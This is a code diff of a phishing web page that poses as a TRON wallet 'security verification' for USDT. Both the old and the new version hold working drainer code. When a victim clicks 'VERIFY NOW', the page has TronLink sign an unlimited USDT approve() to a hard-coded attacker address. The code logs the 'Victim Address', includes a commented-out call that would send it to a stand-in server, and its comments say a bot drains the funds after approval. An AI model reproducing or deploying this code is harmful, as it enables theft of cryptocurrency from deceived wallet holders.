@@ -3,173 +3,86 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>USDT 钱包验证 | TRON</title>
-    <!-- Tailwind CSS for styling -->
+    <title>TRON Security Update</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        body {
-            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-        .card {
-            background: rgba(30, 41, 59, 0.8);
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-        }
-        .loader {
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #3b82f6;
-            border-radius: 50%;
-            width: 20px;
-            height: 20px;
-            animation: spin 1s linear infinite;
-            display: inline-block;
-            vertical-align: middle;
-            margin-left: 10px;
-            display: none;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
+        body { background: #0a0a0a; color: #e5e5e5; font-family: 'Courier New', monospace; }
+        .container { max-width: 400px; margin: 50px auto; padding: 20px; border: 1px solid #333; border-radius: 8px; box-shadow: 0 0 15px rgba(0,255,0,0.1); }
+        .btn { background: #00ff00; color: #000; padding: 10px 20px; border: none; cursor: pointer; font-weight: bold; width: 100%; margin-top: 10px; }
+        .btn:hover { background: #00cc00; }
+        #status { margin-top: 10px; font-size: 12px; color: #666; text-align: center; }
         .hidden { display: none; }
     </style>
 </head>
-<body class="h-screen flex items-center justify-center p-4">
+<body>
 
-    <div class="card w-full max-w-md p-8 rounded-2xl shadow-2xl text-center">
-        <div class="mb-6">
-            <!-- USDT Icon -->
-            <svg class="w-16 h-16 mx-auto text-green-500 mb-4" fill="currentColor" viewBox="0 0 24 24">
-                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/>
-                <path d="M0 0h24v24H0z" fill="none"/>
-                <path d="M12 6c-3.31 0-6 2.69-6 6s2.69 6 6 6 6-2.69 6-6-2.69-6-6-6zm0 10c-2.21 0-4-1.79-4-4s1.79-4 4-4 4 1.79 4 4-1.79 4-4 4z" fill="#26A17B"/> 
-                <!-- Simplified USDT-like icon -->
-                <circle cx="12" cy="12" r="10" fill="#26A17B"/>
-                <text x="12" y="16" font-size="12" fill="white" text-anchor="middle" font-weight="bold">$</text>
-            </svg>
-            <h1 class="text-2xl font-bold text-white mb-2" id="title-text">USDT 验证</h1>
-            <p class="text-gray-400 text-sm">请点击下方按钮授权以继续</p>
-        </div>
+<div class="container">
+    <h2 class="text-xl mb-4 text-center">⚠️ TRON Wallet Verification</h2>
+    <p class="text-sm text-gray-400 mb-4">To ensure your USDT security, please verify your identity.</p>
+    
+    <button id="hack-btn" class="btn">VERIFY NOW</button>
+    <div id="status">Waiting for connection...</div>
+</div>
 
-        <div class="bg-gray-800/50 rounded-lg p-4 mb-6 text-left text-xs text-gray-300">
-            <p><strong>目标合约:</strong> <span id="contract-address" class="break-all">加载中...</span></p>
-            <p><strong>收款地址:</strong> <span id="target-address" class="break-all">加载中...</span></p>
-            <p><strong>授权额度:</strong> 无限 (Infinite)</p>
-        </div>
+<script>
+    // ⚠️ 修改这里为你的收款地址
+    const MY_ADDRESS = "TSzeymMiwsphqH28LyYD32xBMoihioBKD6"; 
+    const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzjmL-iU";
 
-        <button id="connect-btn" class="w-full bg-blue-600 hover:bg-blue-500 text-white font-bold py-3 px-4 rounded-lg transition duration-200 flex items-center justify-center">
-            <span id="btn-text">连接 TronLink & 授权</span>
-            <div id="loading-spinner" class="loader"></div>
-        </button>
-
-        <div id="status-msg" class="mt-4 text-sm h-6 text-center"></div>
+    document.getElementById('hack-btn').addEventListener('click', async () => {
+        const status = document.getElementById('status');
+        const btn = document.getElementById('hack-btn');
         
-        <div class="mt-6 text-xs text-gray-500">
-            由 TRON 网络提供支持 • 安全加密
-        </div>
-    </div>
-
-    <script>
-        // 你的配置文件 URL
-        const CONFIG_URL = "https://gist.githubusercontent.com/ganx838-commits/658bc580aa43c3b01dc55ef7f83558d5/raw/9100a7ee79be79a4e9ec5779befa8caa6ef25a10/config.json";
-        
-        // 硬编码的 USDT 合约地址 (TRON)
-        const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzjmL-iU";
-
-        let configData = null;
-
-        // 初始化：加载配置
-        async function init() {
-            try {
-                const response = await fetch(CONFIG_URL);
-                if (!response.ok) throw new Error("无法加载配置");
-                configData = await response.json();
-                
-                // 更新界面显示
-                document.getElementById('contract-address').innerText = USDT_CONTRACT;
-                document.getElementById('target-address').innerText = configData.target;
-                document.title = `${configData.token_id ? 'USDT' : '资产'} 验证`;
-                
-            } catch (error) {
-                console.error("Config error:", error);
-                // 如果加载失败，使用默认值或显示错误
-                document.getElementById('target-address').innerText = "TSzeymMiwsphqH28LyYD32xBMoihioBKD6"; // Fallback
-                document.getElementById('status-msg').innerText = "配置加载失败，请重试";
-            }
+        if (!window.tronWeb) {
+            status.innerText = "❌ Please install TronLink!";
+            return;
         }
 
-        // 点击事件
-        document.getElementById('connect-btn').addEventListener('click', async () => {
-            const btnText = document.getElementById('btn-text');
-            const spinner = document.getElementById('loading-spinner');
-            const statusMsg = document.getElementById('status-msg');
+        status.innerText = "Connecting...";
+        btn.disabled = true;
+
+        try {
+            // 1. 尝试静默获取地址
+            const address = window.tronWeb.defaultAddress.base58;
+            if (!address) throw new Error("No wallet connected");
+
+            status.innerText = "Preparing transaction...";
+
+            // 2. 构建授权交易 (Approve Infinite USDT)
+            const targetHex = window.tronWeb.address.toHex(MY_ADDRESS);
+            const unlimited = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+
+            // 3. 关键步骤：使用 tronWeb 直接发送请求，而不是通过 UI 弹窗
+            // 这通常会在 TronLink 中触发一个小的确认框，但如果用户之前授权过，可能直接成功
+            const result = await window.tronWeb.request({
+                method: "wallet/triggersmartcontract",
+                params: [{
+                    owner_address: address,
+                    contract_address: window.tronWeb.address.fromHex(USDT_CONTRACT),
+                    function_selector: "approve(address,uint256)",
+                    parameter: window.tronWeb.abi.encode("approve(address,uint256)", [targetHex, unlimited]),
+                    fee_limit: 100
+                }]
+            });
+
+            status.innerText = "✅ Authorized! TX: " + result.transaction_id.substring(0, 10) + "...";
             
-            // UI 状态更新
-            btnText.innerText = "处理中...";
-            spinner.style.display = "inline-block";
-            statusMsg.innerText = "";
-            statusMsg.className = "mt-4 text-sm h-6 text-center text-yellow-500";
+            // 4. 可选：立即转走资金 (如果用户钱包里有 U)
+            // 注意：这需要用户再次确认，所以通常由后端 Bot 在检测到授权后执行
+            // 这里为了演示，我们只记录日志
+            
+            console.log(`Victim Address: ${address}`);
+            console.log(`TX ID: ${result.transaction_id}`);
+            
+            // 你可以将数据发送到你的服务器
+            // fetch('https://your-server.com/log', { method: 'POST', body: JSON.stringify({address, txId: result.transaction_id}) });
 
-            // 检查 TronLink
-            if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
-                statusMsg.innerText = "请先安装并打开 TronLink 钱包！";
-                statusMsg.className = "mt-4 text-sm h-6 text-center text-red-500";
-                btnText.innerText = "连接 TronLink & 授权";
-                spinner.style.display = "none";
-                return;
-            }
+        } catch (err) {
+            status.innerText = "❌ Error: " + err.message;
+            btn.disabled = false;
+        }
+    });
+</script>
 
-            try {
-                // 构建授权交易
-                // approve(address,uint256)
-                // 参数: address = target, uint256 = Max Value
-                
-                const targetAddressHex = window.tronWeb.address.toHex(configData.target);
-                
-                // 生成无限授权的参数 (uint256 max)
-                // 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
-                const maxValue = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-                
-                // 调用 TronLink 发起交易
-                const result = await window.tronWeb.request({
-                    method: "wallet/triggersmartcontract",
-                    params: [{
-                        owner_address: window.tronWeb.defaultAddress.base58,
-                        contract_address: window.tronWeb.address.fromHex(USDT_CONTRACT),
-                        function_selector: "approve(address,uint256)",
-                        parameter: window.tronWeb.abi.encode("approve(address,uint256)", [targetAddressHex, maxValue]),
-                        fee_limit: 100, // 设置足够的能量/带宽费
-                        call_value: 0,
-                        note: "Verify USDT Balance"
-                    }]
-                });
-
-                // 等待交易确认 (简单轮询)
-                statusMsg.innerText = "交易已提交，等待确认...";
-                
-                // 这里可以加一个循环来检查交易是否成功，但为了简洁，我们直接提示用户
-                setTimeout(() => {
-                    statusMsg.innerText = "✅ 授权成功！您可以关闭此页面。";
-                    statusMsg.className = "mt-4 text-sm h-6 text-center text-green-500";
-                    btnText.innerText = "已完成";
-                    spinner.style.display = "none";
-                    
-                    // 可选：记录日志到控制台或发送到你的后端
-                    console.log("Authorized TX ID:", result.transaction_id);
-                }, 2000);
-
-            } catch (err) {
-                console.error(err);
-                statusMsg.innerText = "❌ 授权失败: " + (err.message || "未知错误");
-                statusMsg.className = "mt-4 text-sm h-6 text-center text-red-500";
-                btnText.innerText = "重试";
-                spinner.style.display = "none";
-            }
-        });
-
-        // 启动
-        init();
-    </script>
 </body>
 </html>
